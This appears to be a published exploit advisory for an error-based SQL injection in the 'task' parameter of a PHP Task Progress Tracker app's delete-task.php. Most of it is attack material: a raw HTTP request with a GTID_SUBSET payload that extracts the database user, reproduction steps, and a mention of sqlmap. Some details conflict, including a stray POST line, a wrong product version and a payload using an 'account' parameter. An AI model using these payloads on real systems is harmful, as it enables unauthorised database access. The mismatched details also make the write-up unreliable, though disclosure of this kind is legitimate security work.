# Task Progress Tracker - delete-task.php 'task' SQL inject

#### Exploit Title: Task Progress Tracker - delete-task.php 'task' SQL inject

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: https://www.sourcecodester.com/php/17479/task-progress-tracker-using-php-and-mysql-source-code.html

#### Software Link:https://www.sourcecodester.com/download-code?nid=17479&title=Task+Progress+Tracker+Using+PHP+and+MySQL+with+Source+Code

#### Version: Accounts Manager App 1.0

#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Task Progress Tracker does not filter the content correctly at the "task" parameter, resulting in the generation of SQL injection.

#### Payload used:

```POST /login.php HTTP/1.1
GET http://192.168.67.35:8093/endpoint/delete-task.php?task=4'%20AND%20GTID_SUBSET(CONCAT(0x7170716b71,(SELECT%20user()),0x716a6b7871),4674)--%20nxwp HTTP/1.1
Host: 192.168.67.35:8093
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

#### Proof of Concept

1、Visit the homepage, click to delete the entry, and after capturing the package, find that the file used is delete-task.php

 ![image](https://github.com/joinia/webray.com.cn/blob/main/Task-Progress-Tracker/images/sql1.png)

2、Upon reviewing the source code, it was discovered that the task parameter was directly concatenated into the SQL statement

 ![image](https://github.com/joinia/webray.com.cn/blob/main/Task-Progress-Tracker/images/sql3.png)

4、Construct error injection, annotate database username, and successfully reproduce SQL injection vulnerability.

payload:`account=6'%20AND%20GTID_SUBSET(CONCAT(0x7170716b71,(SELECT%20user()),0x716a6b7871),4674)--%20nxwp`

 ![image](https://github.com/joinia/webray.com.cn/blob/main/Task-Progress-Tracker/images/sql2.png)

5、You can also directly use the sqlmap tool to run the results

![image](https://github.com/joinia/webray.com.cn/blob/main/Task-Progress-Tracker/images/sql4.png)
